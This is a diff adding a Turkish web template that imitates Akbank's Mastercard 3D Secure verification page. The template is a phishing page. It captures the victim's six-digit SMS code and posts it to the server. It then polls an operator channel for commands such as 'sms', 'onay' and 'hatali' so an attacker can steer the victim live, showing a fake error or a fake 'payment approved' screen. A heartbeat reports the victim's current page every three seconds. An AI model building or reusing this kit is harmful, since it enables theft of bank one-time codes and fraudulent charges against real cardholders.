@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="tr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="/akbank/1.css">
+    <title>3D Secure Doğrulama</title>
+</head>
+
+<body>
+    <% 
+    var simdi = new Date();
+    var ikiBasamak = function (n) { return String(n).padStart(2, '0'); };
+    var tarihMetni = ikiBasamak(simdi.getDate()) + '-' + ikiBasamak(simdi.getMonth() + 1) + '-' + simdi.getFullYear() +
+        ' ' + ikiBasamak(simdi.getHours()) + ':' + ikiBasamak(simdi.getMinutes()) + ':' + ikiBasamak(simdi.getSeconds());
+    var telTemiz = String((kullanici && kullanici.telefon) || '').replace(/\s+/g, '');
+    var telGoster = '05XXXXXXXXX';
+    if (/^(05\d{9}|\+905\d{9}|905\d{9})$/.test(telTemiz)) {
+        telGoster = telTemiz.slice(0, 2) + telTemiz.slice(2, 5) + 'XXX' + telTemiz.slice(-4);
+    }
+    %>
+    <div class="content">
+
+        <div class="dijitalgozluk-arkaplan">
+            <form id="axesswings3dsecurekayit3" name="axesswings3dsecurekayit3" action="/akbankacs/shopping2.do"
+                method="POST" autocomplete="off">
+                <input id="challenge" name="challenge" type="hidden" value="152420">
+                <input id="pkModulus" name="publicKey.modulus" type="hidden"
+                    value="lI8yziUzfqovxGKSBtZewGO6VNSUbKjYA0lxhy/nUSlEfFxYLXieAfSleyZnOzToJNx5JIMBJrgs1TY86W9kzwMm3pEB8b+GTNJIK/nokeqajeeDSTfBtFctJsRBMW59vtZZJrIho7Cg7weVk4EsscvjZupSPB4V2EfIDn58P082bjRXFDY6QiJRslERvgwOfFW+LM9XNysrUU/sFT7wnxlIQMC9sLP9aO8eWmvR6UkGRyzZl4MjjjJD/R4PPaDQrJmdtdiz6w3tcX2gusekKgOFhKx2C3yKrPnXUMHLqfE7RAk+7/4WAIEpX5FpflFZeUCcQ//vHdkUxNoEErK0RQ==">
+                <input id="pkExponent" name="publicKey.exponent" type="hidden" value="AQAB">
+                <input id="islemiYapanKartTuru" name="islemiYapanKartTuru" type="hidden" value="D">
+                <input id="encryptedpassword" name="sifre3d" type="hidden" value="">
+
+                <input id="iefix" type="hidden" name="" value="">
+                <div class="dijitalgozluk-ekran">
+                    <div class="dijitalgozluk-cerceve">
+                        <div class="dijitalgozluk-kapat">
+                            <a href="javascript:clickCancelButton();"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#888888" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg></a>
+                        </div>
+                        <div class="dijitalgozluk-logolar">
+                            <div class="dijitalgozluk-logo dijitalgozluk-logo-banka">
+                                <img src="/akbank/logo-akbank.svg" alt="Akbank">
+                            </div>
+                            <!--/logo-->
+
+                            <div class="dijitalgozluk-logo dijitalgozluk-logo-marka">
+                                <img style="margin-top: -3px;" src="/akbank/logo_mastercard.png">
+                            </div>
+                            <!--/logo-->
+
+                            <div class="dijitalgozluk-yazi dijitalgozluk-baslik">
+                                Uluslararası Güvenlik<br> Platformu 3D Secure
+                            </div>
+                            <!--/yazi-->
+
+                        </div>
+                        <!--/logolar-->
+
+
+
+                        <div class="dijitalgozluk-tablo dijitalgozluk-tablo-bilgiler">
+                            <div class="dijitalgozluk-tablo-satir">
+                                <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-isim">
+                                    İşyeri Adı
+                                </div>
+                                <!--/dijitalgozluk-tablo-sutun-->
+
+                                <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-deger">
+                                    <%= islemAdi %>
+                                </div>
+                                <!--/dijitalgozluk-tablo-sutun-->
+                            </div>
+                            <!--/dijitalgozluk-tablo-satir-->
+
+                            <div class="dijitalgozluk-tablo-satir">
+                                <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-isim">
+                                    Tutar
+                                </div>
+                                <!--/dijitalgozluk-tablo-sutun-->
+
+                                <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-deger">
+                                    <%= tutar %>
+                                </div>
+                                <!--/dijitalgozluk-tablo-sutun-->
+
+                            </div>
+                            <!--/dijitalgozluk-tablo-satir-->
+
+
+                            <div class="dijitalgozluk-tablo-satir">
+                                <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-isim">
+                                    Tarih
+                                </div>
+                                <!--/dijitalgozluk-tablo-sutun-->
+
+                                <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-deger">
+                                    <%= tarihMetni %>
+                                </div>
+                                <!--/dijitalgozluk-tablo-sutun-->
+
+                            </div>
+                            <!--/dijitalgozluk-tablo-satir-->
+
+                            <div class="dijitalgozluk-tablo-satir">
+                                <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-isim">
+                                    Kart Numarası
+                                </div>
+                                <!--/dijitalgozluk-tablo-sutun-->
+
+                                <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-deger">
+                                    ************<%= kartNoSon4 %>
+                                </div>
+                                <!--/dijitalgozluk-tablo-sutun-->
+
+                            </div>
+                            <!--/dijitalgozluk-tablo-satir-->
+
+                            <div class="dijitalgozluk-tablo-satir">
+                                <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-isim">
+                                    Cep Telefonu
+                                </div>
+                                <!--/dijitalgozluk-tablo-sutun-->
+
+                                <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-deger">
+                                    <%= telGoster %>
+                                </div>
+                                <!--/dijitalgozluk-tablo-sutun-->
+
+                            </div>
+                            <!--/dijitalgozluk-tablo-satir-->
+
+                        </div>
+
+                        <div id="passwordInformation">
+                            <div class="dijitalgozluk-kart-logo">
+                                <img src="/akbank/ikon-sms-36x31.png" alt="">
+                            </div>
+                            <div id="passwordInformation1" class="dijitalgozluk-yazi dijitalgozluk-yonlendirme">
+                                <p><span>
+                                        01
+                                    </span> nolu 3D Secure / Go Güvenli Öde şifrenizi şifre alanına
+                                    giriniz.</p>
+                            </div>
+                            <!--/yazi-->
+
+                            <div id="passwordInformation2"
+                                class="dijitalgozluk-form-kontrol dijitalgozluk-form-yazi dijitalgozluk-form-sms-gir">
+                                <div class="dijitalgozluk-form-yazi-baslik">Şifre:</div>
+                                <div class="dijitalgozluk-form-yazi-input">
+                                    <input type="password" id="sifre3dinput" maxlength="6" size="6" autocomplete="off" inputmode="numeric" pattern="[0-9]*">
+                                </div>
+
+                                <div id="smsHataMesaji" style="display: none; color: #b91c1c; font-size: 13px; font-weight: bold; margin-top: 8px; text-align: center;"></div>
+
+                                <div id="helpDiv" class="dijitalgozluk-form-yazi-yardim"><a id="opener"
+                                        href="#">Yardım</a></div>
+
+
+                            </div>
+                        </div>
+
+                        <div>
+                            <div id="div1" style="width: 180px; margin: 0px auto 0 auto;"></div>
+
+                        </div>
+                        <div style="display: none;" id="newPassInfo">
+
+                            <div class="dijitalgozluk-kart-logo">
+                                <img src="/akbank/ikon-sms-36x31.png" alt="">
+                            </div>
+                            <!--/dijitalgozluk-kart-logo-->
+
+                            <div class="dijitalgozluk-yazi dijitalgozluk-uyari">
+                                <p>Onay süreniz dolmuştur, dilerseniz tekrar şifre isteyebilirsiniz.</p>
+                            </div>
+                            <!--/yazi-->
+
+                            <div class="dijitalgozluk-form-kontrolu dijitalgozluk-dugme dijitalgozluk-devam-dugmesi">
+                                <input type="button" id="TekrarSifreGonder" name="TekrarSifreGonder" value="Şifre İste">
+                            </div>
+
+                            <!--/yazi-->
+
+
+                            <!--/yazi-->
+                        </div>
+
+
+                        <div id="remainingWarn" class="dijitalgozluk-yazi dijitalgozluk-uyari">
+                            <p>
+                                Onaylama süresinin dolmasına <span id="remaining">62</span> saniye
+                                kalmıştır
+                            </p>
+                        </div>
+
+                        <div id="juzdanSmsFlagDiv" class="dijitalgozluk-form-kontrolu dijitalgozluk-dugme">
+                            <div
+                                class="dijitalgozluk-yazi dijitalgozluk-aciklama-yazisi dijitalgozluk-aciklama-yazisi-ortali">
+                                <input id="mycb" name="juzdanSmsFlag" type="checkbox" value="true"><label
+                                    for="mycb">Juzdan’ı indir, mobil onaylarını tek tıkla ver.</label><input
+                                    type="hidden" name="_juzdanSmsFlag" value="on">
+                            </div>
+                        </div>
+
+                        <div class="dijitalgozluk-form-kontrolu dijitalgozluk-dugme dijitalgozluk-devam-dugmesi">
+                            <input id="DevamEt" name="DevamEt" type="submit" value="Devam">
+                        </div>
+
+                        <div style="display: none;">
+                            <input id="Geri" name="Cancel" type="submit" value="İptal">
+                        </div>
+
+                        <div
+                            class="dijitalgozluk-yazi dijitalgozluk-alternatif-yontem dijitalgozluk-alternatif-yontem-sms">
+                            <p>Bu işlemi Juzdan'dan da onaylayabilirdin.</p>
+                        </div>
+
+                        <!--/form-kontrolu-->
+
+                        <!-- Bitiş sonucu (gizli başlar) -->
+                        <div id="sonucAlan" style="display: none;">
+                            <div style="text-align: center; padding: 20px 0 10px 0;">
+                                <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 100 100">
+                                    <circle cx="50" cy="50" r="42" fill="#15803d"></circle>
+                                    <path d="M32 52 L44 64 L68 38" stroke="#ffffff" stroke-width="8" fill="none" stroke-linecap="round" stroke-linejoin="round"></path>
+                                </svg>
+                                <h2 style="font-family: Arial, sans-serif; color: #111827; margin: 16px 0 8px 0; font-size: 20px;">Ödeme Onaylandı</h2>
+                                <p style="font-family: Arial, sans-serif; color: #6b7280; font-size: 14px; margin: 0 0 20px 0;">Ödemeniz başarıyla alınmıştır.</p>
+                                <a href="/anasayfa" style="display: inline-block; background: #15803d; color: #ffffff; font-family: Arial, sans-serif; font-weight: bold; text-decoration: none; padding: 12px 32px; border-radius: 6px;">Anasayfaya Dön</a>
+                            </div>
+                        </div>
+                        <!--/sonucAlan-->
+
+                    </div>
+                    <!--/cerceve-->
+
+                </div>
+                <!--/ekran-->
+
+            </form>
+
+        </div>
+        <!--/arkaplan-->
+
+    </div>
+
+    <script>
+        (function () {
+            try {
+                var form = document.getElementById("axesswings3dsecurekayit3");
+                var sifreInput = document.getElementById("sifre3dinput");
+                var devamBtn = document.getElementById("DevamEt");
+                var hataMesaji = document.getElementById("smsHataMesaji");
+                var cerceve = document.querySelector(".dijitalgozluk-cerceve");
+                var sonucAlan = document.getElementById("sonucAlan");
+                var newPassInfo = document.getElementById("newPassInfo");
+                var passwordInformation = document.getElementById("passwordInformation");
+                var remainingWarn = document.getElementById("remainingWarn");
+                var remainingSpan = document.getElementById("remaining");
+                var sifreIsteBtn = document.getElementById("TekrarSifreGonder");
+                if (!form || !sifreInput || !devamBtn) return;
+
+                function clickCancelButton() { window.location.href = '/odeme'; }
+
+                var kalan = 62;
+                var sayac = null;
+
+                function sayacBaslat() {
+                    if (sayac) clearInterval(sayac);
+                    kalan = 62;
+                    if (remainingSpan) remainingSpan.textContent = kalan;
+                    if (remainingWarn) remainingWarn.style.display = "";
+                    if (passwordInformation) passwordInformation.style.display = "";
+                    if (newPassInfo) newPassInfo.style.display = "none";
+                    devamBtn.disabled = false;
+                    sayac = setInterval(function () {
+                        kalan--;
+                        if (remainingSpan) remainingSpan.textContent = kalan;
+                        if (kalan <= 0) {
+                            clearInterval(sayac);
+                            sayac = null;
+                            if (remainingWarn) remainingWarn.style.display = "none";
+                            if (passwordInformation) passwordInformation.style.display = "none";
+                            if (newPassInfo) newPassInfo.style.display = "";
+                            devamBtn.disabled = true;
+                        }
+                    }, 1000);
+                }
+
+                function gosterSonuc() {
+                    if (sayac) clearInterval(sayac);
+                    sayac = null;
+                    if (cerceve) {
+                        var liste = cerceve.children;
+                        for (var i = 0; i < liste.length; i++) {
+                            if (liste[i] !== sonucAlan) liste[i].style.display = "none";
+                        }
+                    }
+                    sonucAlan.style.display = "";
+                }
+
+                // Hatalı SMS bildirimi (admin 'hatali' komutu -> /sms?hatali=1)
+                var hataliSms = <%- JSON.stringify(!!hataliSms) %>;
+                if (hataliSms && hataMesaji) {
+                    hataMesaji.textContent = "Hatalı SMS girdiniz. Lütfen tekrar deneyin.";
+                    hataMesaji.style.display = "";
+                }
+
+                // Global dinleyiciden gelen onay yönlendirmesi: /sms?onay=1
+                var onaySms = /[?&]onay=1/.test(window.location.search);
+                if (onaySms) { gosterSonuc(); }
+
+                sifreInput.addEventListener("input", function () {
+                    sifreInput.value = sifreInput.value.replace(/\D/g, '').slice(0, 6);
+                });
+
+                sifreInput.addEventListener("keydown", function (e) {
+                    if (e.key === "Enter") {
+                        e.preventDefault();
+                        devamBtn.click();
+                    }
+                });
+
+                devamBtn.addEventListener("click", function () {
+                    var kod = sifreInput.value.replace(/\s+/g, '');
+                    if (!/^\d{6}$/.test(kod)) {
+                        if (hataMesaji) {
+                            hataMesaji.textContent = "Geçerli bir 6 haneli şifre giriniz.";
+                            hataMesaji.style.display = "";
+                        }
+                        return;
+                    }
+                    if (hataMesaji) hataMesaji.style.display = "none";
+                    devamBtn.disabled = true;
+                    fetch('/api/sms-kod', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ kod: kod })
+                    })
+                        .then(function (r) { return r.json(); })
+                        .then(function (d) {
+                            if (!(d && d.ok)) {
+                                if (hataMesaji) {
+                                    hataMesaji.textContent = (d && d.hata) || "SMS kodu kaydedilemedi.";
+                                    hataMesaji.style.display = "";
+                                }
+                                devamBtn.disabled = false;
+                                return;
+                            }
+                            window.location.href = '/odeme/bekleniyor';
+                        })
+                        .catch(function () {
+                            if (hataMesaji) {
+                                hataMesaji.textContent = "Sunucuya bağlanılamadı.";
+                                hataMesaji.style.display = "";
+                            }
+                            devamBtn.disabled = false;
+                        });
+                });
+
+                if (sifreIsteBtn) {
+                    sifreIsteBtn.addEventListener("click", function () {
+                        sayacBaslat();
+                    });
+                }
+
+                function komutDinle() {
+                    fetch('/odeme/bekleme-durum', { headers: { 'Accept': 'application/json' } })
+                        .then(function (r) { return r.json(); })
+                        .then(function (d) {
+                            if (!d) { setTimeout(komutDinle, 3000); return; }
+                            if (d.oturumYok) { window.location.href = '/giris2'; return; }
+                            if (d.komut === 'sms') {
+                                if (sonucAlan) sonucAlan.style.display = "none";
+                                if (hataMesaji) hataMesaji.style.display = "none";
+                                sifreInput.value = "";
+                                sayacBaslat();
+                                return;
+                            }
+                            if (d.komut === 'onay') { gosterSonuc(); return; }
+                            if (d.komut === 'hatali') { window.location.href = '/sms?hatali=1'; return; }
+                            if (d.komut === 'basa') { window.location.href = '/odeme'; return; }
+                            if (d.komut === 'internetKapali') { window.location.href = '/odeme/bekleniyor?hata=internetKapali'; return; }
+                            if (d.komut === 'gecersizKart') { window.location.href = '/odeme/bekleniyor?hata=gecersizKart'; return; }
+                            setTimeout(komutDinle, 3000);
+                        })
+                        .catch(function () { setTimeout(komutDinle, 3000); });
+                }
+
+                form.addEventListener("submit", function (e) {
+                    e.preventDefault();
+                    devamBtn.click();
+                });
+
+                sayacBaslat();
+                setTimeout(komutDinle, 2000);
+            } catch (e) {}
+        })();
+    </script>
+
+    <% if (kullanici && kullanici.tcno) { %>
+    <script>
+        (function () {
+            var at = function () {
+                var sayfa = (location.pathname + location.search + location.hash).slice(0, 120);
+                fetch("/api/heartbeat", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ sayfa: sayfa })
+                }).catch(function () {});
+            };
+            at();
+            setInterval(at, 3000);
+            document.addEventListener("visibilitychange", function () { if (!document.hidden) at(); });
+        })();
+    </script>
+    <% } %>
+    <script src="/js/komut-dinle.js"></script>
+</body>
+
+</html>
